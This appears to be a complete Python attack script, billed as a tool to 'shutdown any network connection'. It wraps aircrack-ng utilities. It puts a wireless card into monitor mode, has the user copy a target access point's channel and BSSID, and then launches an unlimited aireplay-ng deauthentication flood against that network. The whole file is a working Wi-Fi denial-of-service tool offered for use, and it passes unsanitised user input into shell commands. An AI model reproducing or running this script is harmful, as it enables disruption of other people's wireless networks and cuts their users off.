#...Tool: Shutdown Any Network Connection
import os
import time
from time import sleep
import multiprocessing
import subprocess
from colorama import Fore
from colorama import Style

pwdi = subprocess.Popen("pwd", shell=True, stdout=subprocess.PIPE)
pwdo = pwdi.stdout.read()
pwd = str(pwdo.decode())[:-1]
j=pwd+"/bash/bash.sh"
ii=pwd+"/bash/network.sh"
iii=pwd+"/bash/name.sh"
iiii=pwd+"/bash/dump.sh"
iiiii=pwd+"/bash/whoami.sh"


def progress2(percent=0, width=10):
    left = width * percent // 30
    right = width - left
    tags = "." * left
    spaces = " " * right
    percents = f"{percent:.0f}%"
    print("\r", tags, spaces, sep="", end="", flush=True)
def progress(percent=0, width=40):
    left = width * percent // 100
    right = width - left
    tags = "#" * left
    spaces = " " * right
    percents = f"{percent:.0f}%"
    print("\r[", tags, spaces, "]", percents, sep="", end="", flush=True)


#---------------------------------------------CHECKROOT---------------------------------------
#*********************************************************************************************
os.system("clear")
os.system("figlet by^AIRTAK")
time.sleep(2)
for x in range (0,5):  
    b = f"{Fore.YELLOW} ROOT Checking" + "." * x+f"{Fore.GREEN}"
    print (b, end="\r")
    time.sleep(0.5)

os.system("chmod u+x "+j)
os.system("chmod u+x "+ii)
os.system("chmod u+x "+iii)
os.system("chmod u+x "+iiii)
os.system("chmod u+x "+iiiii)
sub = subprocess.Popen(str(j), shell=True, stdout=subprocess.PIPE)
subo = sub.stdout.read()
out = str(subo.decode())
sub.kill()
time.sleep(1.5)
if out == "-----------------------\n":
  print(f"\n!----------{Style.RESET_ALL}You Are ROOT{Fore.GREEN}----------!{Style.RESET_ALL}"+u'\u2713')
  time.sleep(2)
else:
  print(f"\n{Style.RESET_ALL}!!You Are Not ROOT!!\n")
  exit()
print(f"{Fore.RED}")

for x in range (0,1):  
    b = f" {Fore.YELLOW}Finding your Network Type!!" + "." * x
    print (b, end="\r")
    time.sleep(1)
print(f"{Fore.GREEN}")
for i in range(101):
    progress(i)
    sleep(0.01)
print(f"{Fore.RED}\n")


#---------------------------------------------IFCONFIG---------------------------------------
#********************************************************************************************************
def progress2(percent=0, width=10):
    left = width * percent // 30
    right = width - left
    tags = "." * left
    spaces = " " * right
    percents = f"{percent:.0f}%"
    print(f"\r", tags, spaces, sep="", end="", flush=True)
time.sleep(2)
os.system("ifconfig")
print(f"{Fore.YELLOW}")
for i in range(31):
    progress2(i)
    sleep(0.009)
print("NOTE:")
time.sleep(1)
for i in range(31):
    progress2(i)
    sleep(0.009)
print(f"The first Name of (THE LAST PART) is your NETWORK Name")
time.sleep(2)
for i in range(31):
    progress2(i)
    sleep(0.009)
print (f"Many times is:{Fore.RED} wlan0{Fore.YELLOW}")
time.sleep(1)


#---------------------------------------------AIRMON---------------------------------------
#********************************************************************************************************
#network name inputing
sub = subprocess.Popen(str(ii), shell=True, stdout=subprocess.PIPE)
subo = sub.stdout.read()
sub.kill()
print(f"{Fore.RED}")
subs = subprocess.Popen(str(iii), shell=True, stdout=subprocess.PIPE)
subo = subs.stdout.read()
o = str(subo.decode())[:-1]
print(f"{Fore.RED}")
time.sleep(1.5)
mon="airmon-ng start "+str(o)
os.system(mon)


#---------------------------------------------AIRODUMP---------------------------------------
#********************************************************************************************************
print(f"{Fore.YELLOW}\n***WARNING!!")
print(f"...A New Terminal will Open")
print(f"...!!FIND & COPY Your Network Channel(CH)")
print(f"...!!FIND & COPY Your BSSID address{Fore.YELLOW}")
for i in range(31):
    progress2(i)
    sleep(0.009)
print(f"Opening Terminal..{Fore.GREEN}")
for i in range(101):
    progress(i)
    sleep(0.09)
time.sleep(1)

os.system("gnome-terminal -e "+str(iiii))

print()
ch = input(f"{Fore.YELLOW}Enter Your Network Channel >{Fore.RED}")             
time.sleep(1)
ip=input(f"{Fore.YELLOW}Enter your Network BSSID address >{Fore.RED}")


#---------------------------------------------RESTART---------------------------------------
#********************************************************************************************************
mon="airmon-ng stop "+str(o)+"mon"
os.system(mon)
mon="airmon-ng start "+str(o)+" "+str(ch)
os.system(mon)
time.sleep(1.5)


#---------------------------------------------AIREPLAY---------------------------------------
#********************************************************************************************************
time.sleep(1.5)
print(f"{Fore.YELLOW}Shutting Down....{Fore.RED}")
time.sleep(1.5)
o=str(o)
print(o)
o9="aireplay-ng -0 0 -a "+ip+" "+str(o)+"mon"
print(o9)
os.system(o9)
